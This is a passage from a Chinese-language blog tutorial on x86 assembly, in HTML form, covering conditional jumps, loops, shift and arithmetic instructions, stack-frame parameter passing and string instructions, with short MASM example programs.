aNum[esi] , 110000B</span><br><span class="line">     inc esi</span><br><span class="line">     loop L1</span><br><span class="line">     exit</span><br><span class="line">Main endp</span><br><span class="line">End Main</span><br></pre></td></tr></table></figure><p><strong>CMP</strong><br>功能：对两个操作数作相减运算，不修改操作数，但会影响标志位。会修改OF、SF、ZF、CF、AF、PF。</p><h4 id="设置和清除单个CPU状态标志"><a href="#设置和清除单个CPU状态标志" class="headerlink" title="设置和清除单个CPU状态标志"></a>设置和清除单个CPU状态标志</h4><p><img src="/2018/11/30/汇编基础/1543717974875.png" alt="Alt text"><br><img src="/2018/11/30/汇编基础/1543717989524.png" alt="Alt text"></p><h3 id="条件跳转"><a href="#条件跳转" class="headerlink" title="条件跳转"></a>条件跳转</h3><h4 id="基于特定标志位"><a href="#基于特定标志位" class="headerlink" title="基于特定标志位"></a>基于特定标志位</h4><table><thead><tr><th style="text-align:center">为真时跳转</th><th style="text-align:center">为假时跳转</th><th style="text-align:center">相关标志位</th></tr></thead><tbody><tr><td style="text-align:center">JZ</td><td style="text-align:center">JNZ</td><td style="text-align:center">ZF</td></tr><tr><td style="text-align:center">JC</td><td style="text-align:center">JNC</td><td style="text-align:center">CF</td></tr><tr><td style="text-align:center">JO</td><td style="text-align:center">JNO</td><td style="text-align:center">OF</td></tr><tr><td style="text-align:center">JS</td><td style="text-align:center">JNS</td><td style="text-align:center">SF</td></tr><tr><td style="text-align:center">JP</td><td style="text-align:center">JNP</td><td style="text-align:center">PF</td></tr></tbody></table><h4 id="基于相等比较"><a href="#基于相等比较" class="headerlink" title="基于相等比较"></a>基于相等比较</h4><table><thead><tr><th style="text-align:center">助记符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">JE</td><td style="text-align:center">相等跳转 同JZ</td></tr><tr><td style="text-align:center">JNE</td><td style="text-align:center">不相等跳转 同JNZ</td></tr><tr><td style="text-align:center">JCXZ</td><td style="text-align:center">CX=0跳转</td></tr><tr><td style="text-align:center">JECXZ</td><td style="text-align:center">ECX=0跳转</td></tr></tbody></table><h4 id="基于无符号数比较"><a href="#基于无符号数比较" class="headerlink" title="基于无符号数比较"></a>基于无符号数比较</h4><table><thead><tr><th style="text-align:center">助记符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><strong>JA</strong></td><td style="text-align:center">大于跳转</td></tr><tr><td style="text-align:center"><strong>JB</strong></td><td style="text-align:center">小于跳转</td></tr><tr><td style="text-align:center">JAE</td><td style="text-align:center">大于等于</td></tr><tr><td style="text-align:center">JBE</td><td style="text-align:center">小于等于</td></tr><tr><td style="text-align:center">JNA</td><td style="text-align:center">不大于</td></tr><tr><td style="text-align:center">JNB</td><td style="text-align:center">不小于</td></tr><tr><td style="text-align:center">JNBE</td><td style="text-align:center">同JA</td></tr><tr><td style="text-align:center">JNAE</td><td style="text-align:center">同JB</td></tr></tbody></table><h4 id="基于有符号数比较"><a href="#基于有符号数比较" class="headerlink" title="基于有符号数比较"></a>基于有符号数比较</h4><table><thead><tr><th style="text-align:center">助记符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><strong>JG</strong></td><td style="text-align:center">大于跳转</td></tr><tr><td style="text-align:center"><strong>JL</strong></td><td style="text-align:center">小于跳转</td></tr><tr><td style="text-align:center">JGE</td><td style="text-align:center">大于等于</td></tr><tr><td style="text-align:center">JLE</td><td style="text-align:center">小于等于</td></tr><tr><td style="text-align:center">JNG</td><td style="text-align:center">不大于</td></tr><tr><td style="text-align:center">JNL</td><td style="text-align:center">不小于</td></tr><tr><td style="text-align:center">JNLE</td><td style="text-align:center">同JG</td></tr><tr><td style="text-align:center">JNGE</td><td style="text-align:center">同JL</td></tr></tbody></table><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p>将最小有符号数存到AX：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">Mov</span> <span class="built_in">ax</span>,v1</span><br><span class="line">     <span class="keyword">Cmp</span> <span class="built_in">ax</span>,v2</span><br><span class="line">     <span class="keyword">JL</span>   L1</span><br><span class="line">     <span class="keyword">mov</span> <span class="built_in">ax</span>,v2</span><br><span class="line"><span class="symbol">L1:</span><span class="keyword">cmp</span> <span class="built_in">ax</span>,v3</span><br><span class="line">     <span class="keyword">JL</span>    L2</span><br><span class="line">     <span class="keyword">mov</span> <span class="built_in">ax</span>, v3</span><br><span class="line"><span class="symbol">L2:</span></span><br></pre></td></tr></table></figure></p><p><strong>数组的顺序查找</strong>：<br>查找第一个非0值<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">INCLUDE Irvine32.inc</span><br><span class="line"></span><br><span class="line"><span class="meta">.data</span></span><br><span class="line">intArray SWORD <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">20</span>,<span class="number">35</span>,-<span class="number">12</span>,<span class="number">66</span>,<span class="number">4</span>,<span class="number">0</span></span><br><span class="line">noneMsg <span class="built_in">BYTE</span> <span class="string">"A non-zero value was not found"</span>, <span class="number">0</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">main PROC</span><br><span class="line"><span class="keyword">mov</span><span class="built_in">ebx</span>, OFFSET intArray</span><br><span class="line"><span class="keyword">mov</span><span class="built_in">ecx</span>, LENGTHOF intArray</span><br><span class="line"><span class="symbol">L1:</span> <span class="keyword">cmp</span><span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebx</span>], <span class="number">0</span></span><br><span class="line"><span class="keyword">jne</span>found</span><br><span class="line"><span class="keyword">add</span><span class="built_in">ebx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span>L1</span><br><span class="line"><span class="keyword">jmp</span>notFound</span><br><span class="line"><span class="symbol">found:</span></span><br><span class="line"><span class="keyword">movsx</span><span class="built_in">eax</span>, <span class="built_in">WORD</span> <span class="built_in">PTR</span>[<span class="built_in">ebx</span>]</span><br><span class="line"><span class="keyword">call</span>WriteInt</span><br><span class="line"><span class="keyword">jmp</span>quit</span><br><span class="line"><span class="symbol">notFound:</span></span><br><span class="line"><span class="keyword">mov</span><span class="built_in">edx</span>, OFFSET noneMsg</span><br><span class="line"><span class="keyword">call</span>WriteString</span><br><span class="line"><span class="symbol">quit:</span></span><br><span class="line"><span class="keyword">call</span>Crlf</span><br><span class="line">exit</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure></p><h3 id="条件循环指令"><a href="#条件循环指令" class="headerlink" title="条件循环指令"></a>条件循环指令</h3><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">循环条件</th></tr></thead><tbody><tr><td style="text-align:center">LOOPZ</td><td style="text-align:center">ECX&gt;0 &amp;&amp; ZF=1</td></tr><tr><td style="text-align:center">LOOPE</td><td style="text-align:center">ECX&gt;0 &amp;&amp; ZF=1</td></tr><tr><td style="text-align:center">LOOPNZ</td><td style="text-align:center">ECX&gt;0 &amp;&amp; ZF=0</td></tr><tr><td style="text-align:center">LOOPNE</td><td style="text-align:center">ECX&gt;0 &amp;&amp; ZF=0</td></tr></tbody></table><p><strong>LOOPE和LOOPZ不影响任何状态标志</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">Array        SWORD    -<span class="number">3</span>,-<span class="number">6</span>,-<span class="number">1</span>,-<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">5</span></span><br><span class="line">Sentinel   SWORD    <span class="number">0</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="comment">; …</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span> , offset array</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof array</span><br><span class="line"><span class="symbol">L1:</span><span class="keyword">test</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="number">8000h</span></span><br><span class="line">     <span class="keyword">pushfd</span>            <span class="comment">; pushfd不修改标志位</span></span><br><span class="line">     <span class="keyword">add</span> <span class="built_in">esi</span> , type array</span><br><span class="line">     <span class="keyword">popfd</span></span><br><span class="line">     <span class="keyword">loopnz</span>   L1       <span class="comment">; 注意：loopnz不修改标志位</span></span><br><span class="line">     <span class="keyword">jnz</span> quit</span><br><span class="line">     <span class="keyword">sub</span>  <span class="built_in">esi</span> , type array</span><br><span class="line"><span class="symbol">Quit:</span></span><br></pre></td></tr></table></figure></p><h2 id="0x05-整数算术指令"><a href="#0x05-整数算术指令" class="headerlink" title="0x05 整数算术指令"></a>0x05 整数算术指令</h2><h3 id="移位和循环移位"><a href="#移位和循环移位" class="headerlink" title="移位和循环移位"></a>移位和循环移位</h3><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">SHL</td><td style="text-align:center">逻辑左移</td></tr><tr><td style="text-align:center">SHR</td><td style="text-align:center">逻辑右移</td></tr><tr><td style="text-align:center">SAL</td><td style="text-align:center">算术左移</td></tr><tr><td style="text-align:center">SAR</td><td style="text-align:center">算术右移</td></tr><tr><td style="text-align:center">ROL</td><td style="text-align:center">循环左移</td></tr><tr><td style="text-align:center">ROR</td><td style="text-align:center">循环右移</td></tr><tr><td style="text-align:center">RCL</td><td style="text-align:center">带进位的循环左移</td></tr><tr><td style="text-align:center">RCR</td><td style="text-align:center">带进位的循环右移</td></tr><tr><td style="text-align:center">SHLD</td><td style="text-align:center">双精度左移</td></tr><tr><td style="text-align:center">SHRD</td><td style="text-align:center">双精度右移</td></tr></tbody></table><h4 id="逻辑移位和算术移位"><a href="#逻辑移位和算术移位" class="headerlink" title="逻辑移位和算术移位"></a>逻辑移位和算术移位</h4><p><strong>SHL/SAL</strong><br><code>SHL 目的操作数， 移位位数</code><br>功能：对目的操作数执行左移操作，最低位补0，移出的最高位送入进位标志CF，原来的进位位将丢失。SHL和SAL功能完全一样。<br><img src="/2018/11/30/汇编基础/1543734153075.png" alt="Alt text"></p><p>左移的SHL和SAL是等价的。算术移位不改变符号位，逻辑移位可能改变符号位<br><strong>SHR</strong><br><code>SHR 目的操作数， 移位位数</code><br>功能：将目的操作数逻辑右移，左边空出的位添0，右边最低位被移出，复制到CF位中<br>SHR可以实现无符号数的快速除法<br><img src="/2018/11/30/汇编基础/1543734370787.png" alt="Alt text"><br><strong>SAR</strong><br>有符号数的快速除法，右移过程中最高位保持不变<br><img src="/2018/11/30/汇编基础/1543734566197.png" alt="Alt text"><br><strong>ROL/ROR/RCL/RCR</strong><br>移出的位又送回另一端<br><img src="/2018/11/30/汇编基础/1543734631536.png" alt="Alt text"><br><strong>SHLD/SHRD</strong><br><img src="/2018/11/30/汇编基础/1543735003727.png" alt="Alt text"><br><strong>应用</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BinToAsc PROC  uses <span class="built_in">eax</span> <span class="built_in">ebx</span> <span class="built_in">ecx</span>  <span class="built_in">esi</span></span><br><span class="line"> <span class="comment">;将EAX中的数转换成二进制ASCII码存到ESI指向的数组中</span></span><br><span class="line">  <span class="keyword">Add</span> <span class="built_in">esi</span> , <span class="number">31</span></span><br><span class="line">  <span class="keyword">Mov</span> <span class="built_in">ecx</span> ,<span class="number">32</span></span><br><span class="line"><span class="symbol">Nxt:</span></span><br><span class="line">    <span class="keyword">Mov</span> <span class="built_in">bl</span>,  <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">And</span> <span class="built_in">bl</span> , <span class="number">1</span></span><br><span class="line">    <span class="keyword">Add</span> <span class="built_in">bl</span> , <span class="number">30H</span></span><br><span class="line">    <span class="keyword">Mov</span> [<span class="built_in">esi</span>],<span class="built_in">bl</span></span><br><span class="line">    <span class="keyword">Shr</span>  <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">Dec</span> <span class="built_in">esi</span></span><br><span class="line">  <span class="keyword">Loop</span> nxt</span><br><span class="line">  <span class="keyword">Ret</span></span><br><span class="line">BinToAsc ENDP</span><br></pre></td></tr></table></figure></p><h4 id="乘法和除法指令"><a href="#乘法和除法指令" class="headerlink" title="乘法和除法指令"></a>乘法和除法指令</h4><table><thead><tr><th style="text-align:center">助记符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">MUL</td><td style="text-align:center">无符号乘法</td></tr><tr><td style="text-align:center">IMUL</td><td style="text-align:center">有符号乘法</td></tr><tr><td style="text-align:center">DIV</td><td style="text-align:center">无符号除法</td></tr><tr><td style="text-align:center">IDIV</td><td style="text-align:center">有符号除法</td></tr></tbody></table><h5 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h5><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Mov</span> <span class="built_in">al</span>, <span class="number">30h</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bl</span>, <span class="number">4h</span></span><br><span class="line"><span class="keyword">Mul</span>  <span class="built_in">bl</span>   <span class="comment">;AX =0C0H,CF=0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">ax</span> , <span class="number">2000h</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bx</span> ,<span class="number">100h</span></span><br><span class="line"><span class="keyword">Mul</span>  <span class="built_in">bx</span>   <span class="comment">;DX:AX=0020 0000h,CF=1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">al</span>, -<span class="number">4</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bl</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">IMUL</span>  <span class="built_in">bl</span>             <span class="comment">;AX=0FFF0H,CF=0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">ax</span>, <span class="number">30h</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bx</span>, <span class="number">4h</span></span><br><span class="line"><span class="keyword">IMul</span> <span class="built_in">bx</span>            <span class="comment">;DX:AX =0C0H,CF=0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">al</span>, <span class="number">48</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bl</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">IMUL</span>  <span class="built_in">bl</span>             <span class="comment">;AX=00C0H（即十进制的192）,CF=1</span></span><br></pre></td></tr></table></figure><h5 id="任意进制的码制转换"><a href="#任意进制的码制转换" class="headerlink" title="任意进制的码制转换"></a>任意进制的码制转换</h5><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">ASCIICHAR <span class="built_in">BYTE</span>  <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWZYX'</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">ToASC PROC  uses <span class="built_in">eax</span> <span class="built_in">ebx</span>  <span class="built_in">ecx</span>  <span class="built_in">esi</span>  </span><br><span class="line"><span class="comment">;将EAX中的数按BL中指定的进制数，转换成ASCII字符串放到ESI指向的数组中</span></span><br><span class="line">   <span class="keyword">mov</span> <span class="built_in">ecx</span> , <span class="number">0</span>   <span class="comment">;</span></span><br><span class="line">   <span class="keyword">mov</span> <span class="built_in">cl</span> , <span class="built_in">bl</span>      <span class="comment">; movzx  ecx, bl</span></span><br><span class="line">   <span class="keyword">add</span> <span class="built_in">esi</span> , <span class="number">31</span></span><br><span class="line"><span class="symbol">nxt_ta:</span></span><br><span class="line">   <span class="keyword">mov</span> <span class="built_in">edx</span> , <span class="number">0</span> </span><br><span class="line">   <span class="keyword">div</span>   <span class="built_in">ecx</span></span><br><span class="line">   <span class="keyword">mov</span> <span class="built_in">bl</span>,ASCIICHAR[<span class="built_in">edx</span>]</span><br><span class="line">   <span class="keyword">mov</span> [<span class="built_in">esi</span>],<span class="built_in">bl</span></span><br><span class="line">   <span class="keyword">dec</span> <span class="built_in">esi</span></span><br><span class="line">   <span class="keyword">cmp</span> <span class="built_in">eax</span> , <span class="number">0</span></span><br><span class="line">   <span class="keyword">jnz</span> nxt_ta<span class="comment">; jne</span></span><br><span class="line">   <span class="keyword">ret</span> </span><br><span class="line">ToASC ENDP</span><br></pre></td></tr></table></figure><h2 id="0x06-高级过程"><a href="#0x06-高级过程" class="headerlink" title="0x06 高级过程"></a>0x06 高级过程</h2><h3 id="stack-frame"><a href="#stack-frame" class="headerlink" title="stack frame"></a>stack frame</h3><h4 id="给子过程传递参数的两种基本方式"><a href="#给子过程传递参数的两种基本方式" class="headerlink" title="给子过程传递参数的两种基本方式"></a>给子过程传递参数的两种基本方式</h4><ol><li>通过寄存器传递</li></ol><ul><li>执行效率高</li><li>代码可能显得混乱</li><li>寄存器数量有限<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">esi</span> , offset array</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>,lengthof array</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span> , type array</span><br><span class="line"><span class="keyword">call</span> DumpMem</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>通过堆栈传递</li></ol><ul><li>方式灵活通用</li><li>效率偏低<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> offset array</span><br><span class="line"><span class="keyword">push</span> lengthof array</span><br><span class="line"><span class="keyword">push</span> type array</span><br><span class="line"><span class="keyword">call</span> DumpMem2</span><br></pre></td></tr></table></figure></li></ul><p>使用堆栈传递参数时压入了两类参数：</p><ul><li><strong>值参数（变量或常量的值）</strong></li><li><strong>引用/指针参数（变量的地址）</strong></li></ul><h5 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h5><p>传递值<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">push</span> val2</span><br><span class="line"><span class="keyword">push</span> val1</span><br><span class="line"><span class="keyword">call</span> AddTwo</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/30/汇编基础/1543737991386.png" alt="Alt text"><br><code>AddTwo(val1,val2)</code></p><p>传递引用<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">push</span> offset val2</span><br><span class="line"><span class="keyword">push</span> offset val1</span><br><span class="line"><span class="keyword">call</span> AddTwo</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/30/汇编基础/1543738006283.png" alt="Alt text"><br> <code>AddTwo(&amp;val1,&amp;val2)</code></p><h5 id="重点：参数访问"><a href="#重点：参数访问" class="headerlink" title="重点：参数访问"></a>重点：参数访问</h5><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">Val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">Val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">Push</span> val2</span><br><span class="line"><span class="keyword">Push</span> val1</span><br><span class="line"><span class="keyword">Call</span> AddTwo</span><br><span class="line">…</span><br><span class="line">AddTwo proc</span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">  <span class="keyword">Mov</span>  <span class="built_in">ebp</span> , <span class="built_in">esp</span></span><br><span class="line">  <span class="keyword">mov</span>  <span class="built_in">eax</span> , [<span class="built_in">ebp</span> + <span class="number">12</span>]     <span class="comment">;取得val2</span></span><br><span class="line">  <span class="keyword">add</span>  <span class="built_in">eax</span> ,  [<span class="built_in">ebp</span> + <span class="number">8</span>]       <span class="comment">;加上val1</span></span><br><span class="line">  <span class="keyword">pop</span>   <span class="built_in">ebp</span></span><br><span class="line">  <span class="keyword">ret</span></span><br><span class="line">AddTwo endp</span><br></pre></td></tr></table></figure><p><img src="/2018/11/30/汇编基础/1543738140799.png" alt="Alt text"></p><h4 id="堆栈清理"><a href="#堆栈清理" class="headerlink" title="堆栈清理"></a>堆栈清理</h4><p>因为在调用子过程前，给堆栈压入了一些内容，在子过程返回时，必须调整堆栈指针。</p><ul><li>在调用完子过程后通过加法指令改变ESP值</li><li>通过 RET imm 指令的形式<br>add方法：<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">Val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">Val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">Push</span>  val2</span><br><span class="line"><span class="keyword">Push</span>  val1</span><br><span class="line"><span class="keyword">Call</span>    AddTwo</span><br><span class="line"><span class="keyword">Add</span>    <span class="built_in">esp</span> , <span class="number">8</span></span><br></pre></td></tr></table></figure></li></ul><p>ret方法，在子过程中调用：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">Val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">Val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">Push</span> val2</span><br><span class="line"><span class="keyword">Push</span> val1</span><br><span class="line"><span class="keyword">Call</span> AddTwo</span><br><span class="line">AddTwo proc</span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">12</span>]</span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">  <span class="keyword">ret</span>  <span class="number">8</span></span><br><span class="line">AddTwo endp</span><br></pre></td></tr></table></figure></p><p>采用uses操作符保存寄存器，则要注意uses指令是将寄存器的压栈指令放在子过程的开始，即在堆栈帧里push ebp语句之前，这时，参数偏移地址计算将会受到影响</p><h2 id="0x07-字符串和数组"><a href="#0x07-字符串和数组" class="headerlink" title="0x07 字符串和数组"></a>0x07 字符串和数组</h2><p><code>CLD</code> 清除方向标志<br><code>STD</code>设置方向标志</p><h3 id="MOVSB-MOVSW-MOVSD"><a href="#MOVSB-MOVSW-MOVSD" class="headerlink" title="MOVSB,MOVSW,MOVSD"></a>MOVSB,MOVSW,MOVSD</h3><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">功能</th><th style="text-align:center">ESI和EDI修改量</th></tr></thead><tbody><tr><td style="text-align:center">MOVSB</td><td style="text-align:center">复制字节</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">MOVSW</td><td style="text-align:center">复制字</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">MOVSD</td><td style="text-align:center">复制双字</td><td style="text-align:center">4</td></tr></tbody></table><h4 id="复制双字数组"><a href="#复制双字数组" class="headerlink" title="复制双字数组"></a>复制双字数组</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">  source <span class="built_in">dword</span> <span class="number">20</span> dup(<span class="number">0ffh</span>)</span><br><span class="line">  target  <span class="built_in">dword</span> <span class="number">20</span> dup(?)</span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  <span class="comment">; … </span></span><br><span class="line">  <span class="keyword">cld</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof source</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span> , offset source</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edi</span> , offset target</span><br><span class="line">  <span class="keyword">rep</span> <span class="keyword">movsd</span>    <span class="comment">;将source开始的20个双字复制到target中</span></span><br><span class="line">  <span class="comment">; …</span></span><br></pre></td></tr></table></figure><h3 id="CMPSB-CMPSW-CMPSD"><a href="#CMPSB-CMPSW-CMPSD" class="headerlink" title="CMPSB,CMPSW,CMPSD"></a>CMPSB,CMPSW,CMPSD</h3><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">操作</th></tr></thead><tbody><tr><td style="text-align:center">CMPSB</td><td style="text-align:center">比较字节</td></tr><tr><td style="text-align:center">CMPSW</td><td style="text-align:center">比较字</td></tr><tr><td style="text-align:center">CMPSD</td><td style="text-align:center">比较双字</td></tr></tbody></table><h4 id="单个比较"><a href="#单个比较" class="headerlink" title="单个比较"></a>单个比较</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">  source <span class="built_in">dword</span> <span class="number">1234h</span></span><br><span class="line">  target  <span 